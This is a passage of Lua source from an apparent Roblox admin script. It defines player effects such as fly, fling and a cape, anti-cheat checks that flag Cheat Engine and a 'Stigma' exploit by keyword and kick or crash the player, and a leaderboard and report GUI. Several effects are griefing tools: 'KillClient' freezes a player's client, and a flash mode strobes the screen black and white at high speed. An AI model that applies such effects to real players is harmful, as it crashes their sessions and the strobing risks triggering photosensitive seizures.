		local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
		repeat wait(1/44) 
		bg.BackgroundColor3 = Color3.new(1,1,1) 
		wait(1/44) 
		bg.BackgroundColor3 = Color3.new(0,0,0) 
		until not Effects.effectin or not scr
		if scr then scr:Destroy() end
	elseif mode=='rainbowify' then
		Effects.effectin=true
		repeat wait(0.1) 
			local clr = BrickColor.random() 
			for i, v in pairs(localplayer.Character:children()) do 
				if v:IsA("BasePart") and v.Name~='HumanoidRootPart' and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then 
					v.BrickColor = clr 
					v.Reflectance = 0 
					v.Transparency = 0 
				elseif v:findFirstChild("NameTag") then 
					v.Head.BrickColor = clr 
					v.Head.Reflectance = 0 
					v.Head.Transparency = 0 
					v.Parent.Head.Transparency = 1 
				end 
			end 
		until not Effects.effectin
	elseif mode=='flashish' then
		repeat wait(0.1) 
			for i, v in pairs(localplayer.Character:children()) do 
			if v:IsA("BasePart") and v.Name~='HumanoidRootPart' and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then 
			v.BrickColor = BrickColor.new("Institutional white") v.Reflectance = 0 v.Transparency = 0 
		elseif v:findFirstChild("NameTag") then 
			v.Head.BrickColor = BrickColor.new("Institutional white") 
			v.Head.Reflectance = 0 v.Head.Transparency = 0 
			v.Parent.Head.Transparency = 1 end end 
			wait(1/44) 
			for i, v in pairs(game:service('Players').LocalPlayer.Character:children()) do 
			if v:IsA("BasePart") and v.Name~='HumanoidRootPart' and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then 
			v.BrickColor = BrickColor.new("Really black") 
			v.Reflectance = 0 v.Transparency = 0 elseif v:findFirstChild("NameTag") then 
			v.Head.BrickColor = BrickColor.new("Really black") v.Head.Reflectance = 0 
			v.Head.Transparency = 0 v.Parent.Head.Transparency = 1 end end 
		until not Effects.effectin
	elseif mode=='epilepsy' then
		Effects.effectin=true
		local hum=game:service('Players').LocalPlayer.Character:FindFirstChild('Humanoid')
		if hum then
		hum:remove()
		end
		repeat
		local h=Instance.new('Hint',workspace)
		h.Text=math.random()..'@U*)(&$ We are Epix. )*(&@#^ We are Here. *#@&(* Not Everything is so Black and White. #@*(&$@$'..math.random()
		local f = Instance.new('Message',workspace)
		local d = Instance.new('Message',workspace)
		local s = Instance.new('Message',workspace)
		s.Text = '??Epix?????Inc?? Epix  [ We are Epix. We Are Here. ] ??Epix?????Inc?? Epix '
		d.Text = 't??'..math.random()..'??Epix?????Inc?? Epix '..math.random()..' Inc?????s??Epix?????'..math.random()..'???????Epix ??????t????????????????Inc??????????'
		f.Text = 't???Mr. Epix?????'..math.random()..'??? Epix '..math.random()..' Inc????'..math.random()..'?s????????????????????Epix_t??????????????????Inc????????'
		wait()
		f:remove()
		d:remove()
		s:remove()
		h:remove()
		for i,v in pairs(workspace:GetChildren()) do
		if v.ClassName=='Message' or v.ClassName=='Hint' then
		v:remove()
		end
		end
		wait()
		until not Effects.effectin
	elseif mode=='slip' then
		Effects.slidin=true
		local vel=Instance.new('BodyVelocity',localplayer.Character.Torso)
		vel.Name='Ice_Velocity'
		vel.maxForce=Vector3.new(100000000,100000000,100000000)
		repeat
			vel.velocity=Vector3.new(localplayer.Character.Torso.Velocity.X,-1.01,localplayer.Character.Torso.Velocity.Z)
			wait(1/60)
		until not Effects.slidin
		if vel then vel:Destroy() end
	elseif mode=='unslip' then
		Effects.slidin=false
	elseif mode=='seizure' then
		Effects.effectin=true
		local char=localplayer.Character
		local origvel=char.Torso.Velocity 
		local origrot=char.Torso.RotVelocity
		repeat wait() 
		char.Humanoid.PlatformStand = true 
		char.Torso.Velocity = Vector3.new(math.random(-10,10),-5,math.random(-10,10)) 
		char.Torso.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)) 
		until not Effects.seizin
		char.Humanoid.PlatformStand = false
		char.Torso.Velocity = origvel
		char.Torso.RotVelocity = origrot
	elseif mode=='unseizure' then
		Effects.seizin=false
	elseif mode=='fly' then
		Effects.flyin=true
		repeat wait() until localplayer.Character:findFirstChild("Torso") and localplayer.Character:findFirstChild("Humanoid") 
		local plr = localplayer
		local torso = plr.Character.Torso 
		local flying = true
		local deb = true 
		local ctrl = {f = 0, b = 0, l = 0, r = 0} 
		local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
		local maxspeed = 50 
		local speed = 0 
		local function Fly() 
		local bg = Instance.new("BodyGyro", torso) 
		bg.P = 9e4 
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
		bg.cframe = torso.CFrame 
		local bv = Instance.new("BodyVelocity", torso) 
		bv.velocity = Vector3.new(0,0.1,0) 
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
		repeat wait() 
		plr.Character.Humanoid.PlatformStand = true 
		if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
		speed = speed+.5+(speed/maxspeed) 
		if speed > maxspeed then 
		speed = maxspeed 
		end 
		elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
		speed = speed-1 
		if speed < 0 then 
		speed = 0 
		end 
		end 
		if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
		bv.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - workspace.CurrentCamera.CoordinateFrame.p))*speed 
		lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
		elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
		bv.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - workspace.CurrentCamera.CoordinateFrame.p))*speed 
		else 
		bv.velocity = Vector3.new(0,0.1,0) 
		end 
		bg.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
		until not flying or not Effects.flyin or not torso or not torso.Parent
		ctrl = {f = 0, b = 0, l = 0, r = 0} 
		lastctrl = {f = 0, b = 0, l = 0, r = 0} 
		speed = 0 
		bg:Destroy() 
		bv:Destroy() 
		plr.Character.Humanoid.PlatformStand = false 
		end 
		local moos
		local moos2
		moos=mouse.KeyDown:connect(function(key) 
		if not Effects.flyin or not torso or not torso.Parent then moos:disconnect() flying=false Effects.flying=false return end
		if key:lower() == "e" then 
		if flying then flying = false 
		else 
		flying = true 
		Fly() 
		end 
		elseif key:lower() == "w" then 
		ctrl.f = 1 
		elseif key:lower() == "s" then 
		ctrl.b = -1 
		elseif key:lower() == "a" then 
		ctrl.l = -1 
		elseif key:lower() == "d" then 
		ctrl.r = 1 
		end 
		end) 
		moos2=mouse.KeyUp:connect(function(key)
		if not Effects.flyin or not torso or not torso.Parent then moos2:disconnect() flying=false Effects.flyin=false return end 
		if key:lower() == "w" then 
		ctrl.f = 0 
		elseif key:lower() == "s" then 
		ctrl.b = 0 
		elseif key:lower() == "a" then 
		ctrl.l = 0 
		elseif key:lower() == "d" then 
		ctrl.r = 0 
		end 
		end)
		Fly()
	elseif mode=='unfly' then
		Effects.flyin=false
	elseif mode=='loopfling' then
		Effects.flingin=true
		local torso=localplayer.Character:findFirstChild("Torso") 
		local hum=localplayer.Character:findFirstChild("Humanoid")
		if torso and hum then 
		repeat
		local xran local zran
		repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
		repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
		hum.Sit = true torso.Velocity = Vector3.new(0,0,0)
		local frc = Instance.new("BodyForce", torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
		wait(1) until not Effects.flingin or not torso or not hum
		end
	elseif mode=='unloopfling' then
		Effects.flingin=false
	elseif mode=='dance' then
		Effects.effectin=true
		local anim=Instance.new('Animation',localplayer.Character)
		anim.AnimationId='http://www.mulrbx.com/Asset?ID=27789359'
		anim.Name='Dance'
		local human = localplayer.Character:FindFirstChild("Humanoid")
		local dancer = human:LoadAnimation(anim)
		dancer:Play()
		repeat wait() until not Effects.effectin
		dancer:Stop()
		dancer:Destroy()
	end
end

set.MoveCape=function()
	local p=localplayer.Character:FindFirstChild('EpicCape')
	if p then
	p.Anchored=false
	local torso=localplayer.Character:WaitForChild('Torso')
	local motor1 = Instance.new("Motor", p)
	motor1.Part0 = p
	motor1.Part1 = torso
	motor1.MaxVelocity = .01
	motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
	motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
	local wave = false
	repeat wait(1/44)
	local ang = 0.1
	local oldmag = torso.Velocity.magnitude
	local mv = .002
	if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
	ang = ang + math.min(torso.Velocity.magnitude/11, .5)
	motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
	motor1.DesiredAngle = -ang
	if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
	repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
	if torso.Velocity.magnitude < .1 then wait(.1) end
	until not p or p.Parent ~= torso.Parent
	end
end

set.LaunchAnti=function(mode)
	if mode=='speed' then
		local humanoid=localplayer.Character:WaitForChild('Humanoid')
		local bob=true localplayer.Character.Humanoid.Died:connect(function() bob=false end)
		while wait(1) and bob and humanoid~=nil do
			if select(2,pcall(workspace.GetRealPhysicsFPS)):match('GetRealPhysicsFPS') then
				if workspace:GetRealPhysicsFPS() > tonumber(set.RandiSpeed) then
					Remote('Exploited','kick','Speed exploiting')
				end
			else
				Remote('Exploited','kick','Method change detected.')
			end
		end
	elseif mode=='nameid' then
		if localplayer.userId~=set.RealID or localplayer.Name~=set.RealName then 
			Remote('Exploited','kick','Local name/userID does not match real name/userID')
		end 
		localplayer.Changed:connect(function(o) 
			if o=='Name' or o=='userId' then 
				if localplayer.userId~=set.RealID or localplayer.Name~=set.RealName then 
					Remote('Exploited','kick','Local name/userID does not match real name/userID')
				end 
			end 
		end)
	elseif mode=='ce' then
		for i,v in pairs(game.LogService:GetLogHistory()) do
			for k,m in pairs(v) do
				if type(m)=='string' and m:lower():find('program files') and m:lower():find('cheat engine') and m:lower():find('failed to resolve texture format') then 
					Remote('Exploited','kick','Cheat Engine installation detected.')
				end
			end
		end
	elseif mode=='detection' then
		coroutine.wrap(function()
			game:service('LogService').MessageOut:connect(function(Message, Type)
				if Message:lower():find('stigma') then Remote('Exploited','crash','Detected as using Stigma.') end
			end)	
			for i,v in pairs(game.LogService:GetLogHistory()) do
				for k,m in pairs(v) do
					if type(m)=='string' and m:lower():find('stigma') then Remote('Exploited','crash','Detected as using Stigma.') end
				end
			end
		end)()
	elseif mode=='god' then
		local humanoid=localplayer.Character:WaitForChild('Humanoid')
		local bob=true localplayer.Character.Humanoid.Died:connect(function() bob=false end)
		local moos=localplayer.Character.Humanoid.Changed:connect(function(c)
			if not bob or humanoid==nil then moos:disconnect() return end
			if tostring(localplayer.Character.Humanoid.Health)=="-1.#IND" then 
				Remote('Exploited','kick','Infinite Health [Godded]')
			end 
		end)
		localplayer.Character.Humanoid.Health=localplayer.Character.Humanoid.Health-1
	elseif mode=='selection' then
		game:GetService("Selection").SelectionChanged:connect(function() Remote('Exploited','kick','Selection was changed.') end)
	elseif mode=='check1' then
		local check = pcall(function() game:GetService("CoreGui").RobloxLocked=true end)
		if check then Remote('Exploited','kick','Has access to protected methods.') end
	end
end

set.Nilify=function()
LocalPlayer=localplayer
Camera=workspace.CurrentCamera
LocalPlayer.Parent=nil
if LocalPlayer.Character then LocalPlayer.Character:Destroy() end
LocalPlayer.Character = nil
function make()
f = Instance.new("Part",workspace)
f.Name = 'Kohls Probe '..LocalPlayer.Name
f.Anchored = true
f.Locked = true
f.Size = Vector3.new(1,1,1)
f.Transparency = 0.5
f.FormFactor = "Custom"
f.BrickColor = BrickColor.new("Really black")
f.Material = "Plastic"
f.Shape = "Ball"
f.TopSurface = "Smooth"
f.BottomSurface = "Smooth"
f.Reflectance = 0
f.CanCollide = false
light = Instance.new('PointLight',f)
light.Range = 20
light.Brightness = 1
light.Color = Color3.new(1,1,1)
light.Enabled = true
coroutine.wrap(function()
while f:IsDescendantOf(workspace) and not LocalPlayer.Character and wait() do
f.CFrame = Camera.Focus
end
f:Destroy()
end)()
end
make()
coroutine.wrap(function()
workspace.ChildRemoved:connect(function(c)
if not f or f.Parent~=workspace or not f:IsDescendantOf(workspace) or c==f then
make()
end
end)
end)()
coroutine.wrap(function()
LocalPlayer.Chatted:connect(function(msg)
if msg:lower()=='poff' then 
light.Enabled=false
elseif msg:lower()=='pon' then 
light.Enabled=true
end
if light.Enabled==true then
game:service('Chat'):Chat(f,LocalPlayer.Name..': '..msg,Enum.ChatColor.Red)
end
end)
end)()
end

set.Drug=function()
	local v=localplayer
	coroutine.wrap(function()
		local msgs={{Msg='We need more..... philosophy... ya know?',Color=Enum.ChatColor.Green},{Msg='OH MY GOD STOP TRYING TO EAT MY SOUL',Color=Enum.ChatColor.Red},{Msg='I.... CANT.... FEEL.... MY FACE',Color=Enum.ChatColor.Red},{Msg='DO YOU SEE THE TURTLE?!?!',Color=Enum.ChatColor.Red},{Msg='Omg puff the magic dragon!!!!',Color=Enum.ChatColor.Green},{Msg='Omg double wat',Color=Enum.ChatColor.Blue},{Msg='WHO STOLE MY LEGS',Color=Enum.ChatColor.Red},{Msg='I... I think I might be dead....',Color=Enum.ChatColor.Blue},{Msg="I'M GOING TO EAT YOUR FACE",Color=Enum.ChatColor.Red},{Msg='Hey... Like... What if, like, listen, are you listening? What if.. like.. earth.. was a ball?',Color=Enum.ChatColor.Green},{Msg='WHY IS EVERYBODY TALKING SO LOUD AHHHHHH',Color=Enum.ChatColor.Red},{Msg='Woooo man do you see the elephent... theres an elephent man..its... PURPLE OHMY GOD ITS A SIGN FROM LIKE THE WARDROBE..',Color=Enum.ChatColor.Blue}}
		local chat=game:GetService('Chat')
		coroutine.wrap(function()
		local val=Instance.new('StringValue',v.Character.Head)
		local old=math.random()
		coroutine.wrap(function()
		while v and v.Character and v.Character.Head and val and val.Parent==v.Character.Head and v.Character.Humanoid.Health>0 do
		local new=math.random(1,#msgs)
		for k,m in pairs(msgs) do
		if new==k then
		if old~=new then
		old=new
		print(m.Msg)
		chat:Chat(v.Character.Head,m.Msg,m.Color)
		end
		end
		end
		wait(5)
		end
		end)()
		v.Character.Humanoid.WalkSpeed=-16
		coroutine.wrap(function()
			repeat
			wait(0.1)
			workspace.CurrentCamera.FieldOfView=math.random(20,80) 
			game:service('Players').LocalPlayer.Character.Humanoid.Health=game:service('Players').LocalPlayer.Character.Humanoid.Health-0.5
			until game:service('Players').LocalPlayer.Character.Humanoid.Health<=0 or not game:service('Players').LocalPlayer.Character:FindFirstChild('Torso')
			workspace.CurrentCamera.FieldOfView=70
			end)()
			wait(10)
			coroutine.wrap(function()
				local torso = game:service('Players').LocalPlayer.Character:findFirstChild("Torso")
				local bg = Instance.new("BodyGyro", torso) 
				bg.Name = "SPINNER" 
				bg.maxTorque = Vector3.new(0,math.huge,0) 
				bg.P = 11111 
				bg.cframe = torso.CFrame 
				repeat wait(1/44) 
				bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
				until not bg or bg.Parent ~= torso
			end)()
			wait(20)
			coroutine.wrap(function()
			repeat wait() 
			game:service('Players').LocalPlayer.Character.Humanoid.PlatformStand = true 
			game:service('Players').LocalPlayer.Character.Torso.Velocity = Vector3.new(math.random(-10,10),-5,math.random(-10,10)) 
			game:service('Players').LocalPlayer.Character.Torso.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)) 
			until nil
			end)()
		end)()
end)()
end

set.Glitch=function(type,int)
	if type=='off' then 
		Effects.glitching=false
	else
		Effects.glitching=false
		wait(0.5)
		local char=localplayer.Character
		local torso=char:FindFirstChild('Torso')
		local posed=false
		Effects.glitching=true
		--repeat
		Effects.glitchrun=game:service('RunService').RenderStepped:connect(function()
			if not Effects.glitching then Effects.glitchrun:disconnect() end
			if posed then
				if type=='ghost' then
					torso.CFrame=torso.CFrame+Vector3.new(((tonumber(int) or 100)*2),0,0)
				elseif type=='trippy' then
					torso.CFrame=torso.CFrame*CFrame.new(((tonumber(int) or 100)*2),0,0)
				elseif type=='vibrate' then
					local num=math.random(1,4)
					if num==1 then
						torso.CFrame=torso.CFrame*CFrame.new(((tonumber(int)*2) or 100),0,0)
					elseif num==2 then
						torso.CFrame=torso.CFrame*CFrame.new(-((tonumber(int)*2) or 100),0,0)
					elseif num==3 then
						torso.CFrame=torso.CFrame*CFrame.new(0,0,-((tonumber(int)*2) or 100))
					elseif num==4 then
						torso.CFrame=torso.CFrame*CFrame.new(0,0,((tonumber(int)*2) or 100))
					end
				end
				posed=false
				else
				if type=='ghost' then
					torso.CFrame=torso.CFrame+Vector3.new(-((tonumber(int)*2) or 100),0,0)
				elseif type=='trippy' then
					torso.CFrame=torso.CFrame*CFrame.new(-((tonumber(int)*2) or 100),0,0)
				elseif type=='vibrate' then
					local num=math.random(1,4)
					if num==1 then
						torso.CFrame=torso.CFrame*CFrame.new(((tonumber(int)*2) or 100),0,0)
					elseif num==2 then
						torso.CFrame=torso.CFrame*CFrame.new(-((tonumber(int)*2) or 100),0,0)
					elseif num==3 then
						torso.CFrame=torso.CFrame*CFrame.new(0,0,-((tonumber(int)*2) or 100))
					elseif num==4 then
						torso.CFrame=torso.CFrame*CFrame.new(0,0,((tonumber(int)*2) or 100))
					end
				end
				posed=true
			end
			--wait(1/100)
		end)
		--until not Effects.glitching
	end
end

set.Phase=function(mode)
	local cam=workspace.CurrentCamera
	local char=localplayer.Character
	if mode then
		for a, obj in pairs(localplayer.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
		char.Parent=cam
	else
		char.Parent=workspace
	end
end

set.KillClient=function()
	coroutine.wrap(function()
		while true do end
	end)()
end

set.MainScrollGui=function()
local scr = Instance.new("ScreenGui") 
scr.Name = set.GuiName.."ScrollGUI"
local info = Instance.new('TextLabel',scr)
info.BackgroundTransparency=set.Transparency-0.2
info.BorderSizePixel=0
info.BackgroundColor3=set.PrimaryColor
info.TextColor3=set.TextColor
info.TextStrokeColor3=set.TextStrokeColor
info.TextStrokeTransparency=set.TextStrokeTransparency
info.Font=set.Font
info.Text=''
info.FontSize='Size18'
info.Size=UDim2.new(0,info.TextBounds.X+5,0,20)
info.Position=UDim2.new(1,0,0,0)
info.Visible=false
info.ZIndex=10
local drag = Instance.new("TextButton", scr) 
drag.Draggable = true
drag.BackgroundTransparency = 1
drag.Size = UDim2.new(0,405,0,30) 
drag.Name = 'Drag'
drag.Position = UDim2.new(0,-400,0.5,-160)
coroutine.wrap(function()
repeat wait() until (not drag) or scr.Parent.Name=='PlayerGui'
wait()
if set.Animations then
	drag:TweenPosition(UDim2.new(0,35,0.5,-160),'Out','Elastic',1)
else
	drag.Position=UDim2.new(0,35,0.5,-160)
end
end)()
drag.AutoButtonColor = false 
drag.Text = ""
drag.ZIndex=1
local main = Instance.new("Frame", drag) 
main.Size = UDim2.new(1,0,0,400) 
main.ClipsDescendants = true
main.BackgroundTransparency=1--set['Transparency']
main.BackgroundColor3=set['PrimaryColor']
main.BorderSizePixel=0
local cmf = Instance.new("ScrollingFrame", main) 
cmf.Position = UDim2.new(0,0,0,30)
cmf.Size=UDim2.new(1,0,1,-40)
cmf.BorderSizePixel=0
cmf.BackgroundColor3=set.PrimaryColor
cmf.ZIndex = 1
cmf.ScrollBarThickness=2
cmf.CanvasSize=UDim2.new(0,0,#cmf:children()/20,0)
cmf.BackgroundTransparency=set.Transparency--1
cmf.BottomImage='http://mulrbx.com/asset?id=158348114'
cmf.MidImage='http://mulrbx.com/asset?id=158348114'
cmf.TopImage='http://mulrbx.com/asset?id=158348114'
local top = Instance.new("TextLabel", drag)
top.Position=UDim2.new(0,0,0,0)
top.Size=UDim2.new(1,0,0,30)
top.BackgroundColor3=set.PrimaryColor
top.BackgroundTransparency=set.Transparency
top.Text=''
top.BorderSizePixel=0
top.ZIndex=9
top.TextColor3=set['TextColor']
top.TextStrokeTransparency=set.TextStrokeTransparency
top.TextStrokeColor3=set.TextStrokeColor
top.Font=set.Font
top.FontSize='Size18'
local cls = Instance.new("TextButton", drag) 
cls.Style = "Custom" 
cls.Size = UDim2.new(0,20,0,20) 
cls.Position = UDim2.new(1,-25,0,5) 
cls.ZIndex = 10
cls.Font = set.Font 
cls.FontSize = "Size18" 
cls.BackgroundColor3=set['PrimaryColor']
cls.BorderSizePixel=0
cls.TextColor3 = set.TextColor--set['SecondaryColor']
cls.BackgroundTransparency=set['Transparency']
cls.Text = "X" 
cls.MouseButton1Click:connect(function() scr:Destroy() end)
local hide = Instance.new("TextButton", drag) 
hide.Style = "Custom" 
hide.Size = UDim2.new(0,20,0,20) 
hide.Position = UDim2.new(1,-50,0,5) 
hide.ZIndex = 10 
hide.Font = set.Font 
hide.FontSize = "Size18" 
hide.Text = "-" 
hide.BackgroundColor3=set['PrimaryColor']
hide.BorderSizePixel=0
hide.TextColor3 = set.TextColor--set['SecondaryColor']
hide.BackgroundTransparency=set['Transparency'] 
hide.MouseButton1Click:connect(function() 
	if main.Visible==true then
		main.Visible=false
		hide.Text='+'
	else
		main.Visible=true
		hide.Text='-'
	end
end)
local ent = Instance.new("TextLabel") 
ent.BackgroundTransparency = 1 
ent.Font = set.Font
ent.FontSize = "Size18" 
ent.ZIndex = 8
ent.Text = "" 
ent.Size=UDim2.new(1,-2,0,20)
ent.TextColor3 = set['TextColor']
ent.TextStrokeColor3 = set['TextStrokeColor'] 
ent.TextStrokeTransparency=set.TextStrokeTransparency
ent.TextXAlignment = "Left" 
ent.TextYAlignment = "Top"
local desc=Instance.new('StringValue',ent)
desc.Name='Desc'
local num = 0
return scr, cmf, ent, num, top, main, info
end 

set.UpdateAdminChat=function(text)
local v=localplayer
	if playergui:FindFirstChild(set.GuiName..'adminchat') then
		local gui=playergui:FindFirstChild(set.GuiName..'adminchat')
		local frame=v.PlayerGui:FindFirstChild(set.GuiName..'adminchat').Frame.Frame
		if #frame:children()==5 then 
			frame:children()[1]:Destroy() 
			for h,l in pairs(frame:children()) do
				l.Position=UDim2.new(0,0,0,20*(h-1))
			end
		end
		local ent = Instance.new("TextLabel") 
		ent.BackgroundTransparency = 1 
		ent.Font = set.Font
		ent.FontSize = "Size18" 
		ent.ZIndex = 8
		ent.Text = "" 
		ent.TextColor3 = set['TextColor']
		ent.TextStrokeColor3 = set['TextStrokeColor'] 
		ent.TextStrokeTransparency=set.TextStrokeTransparency
		ent.TextXAlignment = "Left" 
		ent.TextYAlignment = "Top"
		local cl = ent:Clone() 
		cl.Parent = frame
		cl.Text = text
		cl.Position = UDim2.new(0,0,0,20*(#frame:children()-1))
		cl.Size=UDim2.new(0,300,0,20)
		cl.TextScaled=true
		cl.FontSize='Size24'
		cl.Font=set.Font
	end
end

set.ReportNotify=function(p,p2,msg)
	local scr=Instance.new('ScreenGui',playergui) scr.Name=set.GuiName..p.Name..'ReportGui'
	local frame=Instance.new('Frame',scr)
	local label=Instance.new('TextLabel',frame)
	local yes=Instance.new('TextButton',frame)
	local no=Instance.new('TextButton',frame)
	frame.BackgroundColor3=set['PrimaryColor']
	frame.BorderSizePixel=0
	frame.BackgroundTransparency=set['Transparency']
	frame.BorderSizePixel=0
	frame.Position=UDim2.new(1,260,1,-250)
	frame.Size=UDim2.new(0,300,0,200)
	if set.Animations then
		frame:TweenPosition(UDim2.new(1,-350,1,-250),'Out','Elastic',1)
	else
		frame.Position=UDim2.new(1,-350,1,-250)
	end
	frame.ClipsDescendants=true
	label.BackgroundTransparency=1
	label.BorderSizePixel=0
	label.Position=UDim2.new(0,0,0,0)
	label.Size=UDim2.new(1,0,0,120)
	label.TextColor3=set['TextColor']
	label.ClipsDescendants=false
	label.FontSize='Size24'
	label.Font=set.Font
	label.TextXAlignment='Center'
	label.TextYAlignment='Center'
	label.Text=p.Name.."'s Report for "..p2.Name..": "..msg.." - Teleport now?"
	label.Name='Label'
	label.TextScaled=true
	label.TextWrapped=true
	frame.Draggable=true
	frame.Active=true
	label.Draggable=false
	yes.BackgroundColor3=Color3.new(0,1,0)
	yes.TextColor3=set['TextColor']
	yes.Text='Teleport'
	yes.Font=set.Font
	yes.FontSize='Size24'
	yes.TextStrokeTransparency=set.TextStrokeTransparency
	yes.Name='yes'
	no.Font=set.Font
	no.FontSize='Size36'
	no.BackgroundColor3=Color3.new(1, 0, 0)
	no.TextColor3=set['TextColor']
	no.Text='Busy'
	no.Name='no'
	no.TextStrokeTransparency=set.TextStrokeTransparency
	yes.Size=UDim2.new(0,100,0,50)
	yes.Position=UDim2.new(0,20,0,130)
	no.Size=UDim2.new(0,100,0,50)
	no.Position=UDim2.new(0,180,0,130)
end

set.AddPlayerToList=function(p,type)
	Remote('CheckAdmin')
	local scr=playergui:FindFirstChild(set.GuiName..'CUSTOMLEADERBOARD')
	if not scr then return end
	local main=scr.ListDrag.ScrollingFrame
	if main:FindFirstChild(p.Name) then return end
	local f=Instance.new('Frame',main)
	f.Name=p.Name
	f.BackgroundTransparency=1--set.Transparency
	f.BorderSizePixel=0
	f.BackgroundColor3=set.PrimaryColor
	f.BorderSizePixel=0
	f.Size=UDim2.new(1,0,0,20)
	f.Position=UDim2.new(0,0,0,20*(#main:children()-1))
	local ico=Instance.new('ImageLabel',f)
	ico.Size=UDim2.new(0,20,0,20)
	ico.BackgroundTransparency=1
	ico.BorderSizePixel=0
	if type=='Scripter' then
		ico.Image='http://www.mulrbx.com/asset/?id=113059239'
	elseif localplayer:IsFriendsWith(p.userId) and p~=localplayer then
		ico.Image='http://www.mulrbx.com/asset/?id=99749771'
	elseif type=='Admin' then
		ico.Image='http://www.mulrbx.com/asset/?id=99727663'
	elseif type=='BC' then
		ico.Image='rbxasset://textures/ui/TinyBcIcon.png'
	elseif type=='TBC' then
		ico.Image='rbxasset://textures/ui/TinyTbcIcon.png'
	elseif type=='OBC' then
		ico.Image='rbxasset://textures/ui/TinyObcIcon.png'
	else
		ico.Visible=false
	end
	local l=Instance.new('TextButton',f)
	l.Text=p.Name
	for i,v in pairs(game:service('Teams'):children()) do
		if p.TeamColor==v.TeamColor then
			l.Text=p.Name..' ['..v.Name..']'
		end
	end
	l.BackgroundTransparency=1
	l.TextColor3=p.TeamColor.Color--set.TextColor
	l.Font=set.Font
	l.TextXAlignment='Left'
	l.TextScaled=true
	l.TextStrokeTransparency=set.TextStrokeTransparency
	l.TextStrokeColor3=set.TextStrokeColor
	if ico.Visible==true then
		l.Size=UDim2.new(1,-20,1,0)
		l.Position=UDim2.new(0,20,0,0)
	else
		l.Size=UDim2.new(1,0,1,0)
	end
	l.MouseButton1Click:connect(function()
		Remote('CheckAdmin')
		local menu=f:FindFirstChild('Menu')
		if not menu then
			local menu=Instance.new('Frame',f)
			menu.Name='Menu'
			menu.Size=UDim2.new(0,50,0,100)
			menu.Position=UDim2.new(0,-50,0,0)
			menu.BackgroundColor3=set.PrimaryColor
			menu.BackgroundTransparency=set.Transparency
			menu.BorderSizePixel=0
			menu.Visible=true--false
			local report=Instance.new('TextButton',menu)
			report.BackgroundTransparency=1
			report.TextColor3=set.TextColor
			report.TextStrokeTransparency=set.TextStrokeTransparency
			report.TextStrokeColor3=set.TextStrokeColor
			report.Text='Report'
			report.Font=set.Font
			report.TextScaled=true
			report.Size=UDim2.new(1,0,0,10)
			report.Position=UDim2.new(0,0,0,10*(#menu:children()-1))
			report.MouseButton1Click:connect(function()
				menu.Visible=false
				local rmain=Instance.new('Frame',scr)
				rmain.Size=UDim2.new(0,300,0,350)
				rmain.Position=UDim2.new(0.5,-150,1,175)
				if set.Animations then
					rmain:TweenPosition(UDim2.new(0.5,-150,0,50),'Out','Elastic',1)
				else
					rmain.Position=UDim2.new(0.5,-150,0,50)
				end
				rmain.BackgroundColor3=set.PrimaryColor
				rmain.BorderSizePixel=0
				rmain.Draggable=true
				rmain.Active=true
				rmain.BackgroundTransparency=set.Transparency
				local rl=Instance.new('TextLabel',rmain)
				rl.BackgroundTransparency=1
				rl.Text='Report '..p.Name
				rl.TextColor3=set.TextColor
				rl.TextStrokeTransparency=set.TextStrokeTransparency
				rl.TextScaled=true
				rl.TextStrokeColor3=set.TextStrokeColor
				rl.Size=UDim2.new(1,0,0,50)
				local rd=Instance.new('TextBox',rmain)
				rd.Size=UDim2.new(1,-10,1,-100)
				rd.Position=UDim2.new(0,5,0,55)
				rd.BackgroundColor3=set.PrimaryColor
				rd.BorderSizePixel=0
				rd.TextColor3=set.TextColor
				rd.TextStrokeTransparency=set.TextStrokeTransparency
				rd.TextStrokeColor3=set.TextStrokeColor
				rd.TextScaled=true
